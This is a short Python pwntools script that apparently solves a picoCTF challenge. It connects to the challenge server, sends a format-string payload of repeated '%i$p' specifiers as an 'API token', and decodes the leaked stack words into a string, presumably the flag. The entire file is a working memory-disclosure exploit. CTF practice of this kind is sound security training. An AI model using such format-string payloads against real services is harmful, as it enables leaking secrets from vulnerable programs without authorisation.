#!/usr/bin/python3

from pwn import *
import sys

r = remote('mercury.picoctf.net', 16439)

r.sendline('1') # Buy some stonks

s = ''

for i in range(30):
    s += f'%{i}$p-'

r.sendlineafter('What is your API token?\n', s)
r.recvline()
a = r.recvline().split(b'-')
s = b''
print(a)
for i in a:
    if len(i) == len('0xffffffff'):
        s += bytes.fromhex(i.decode()[2:])[::-1]

print(s)

r.interactive()
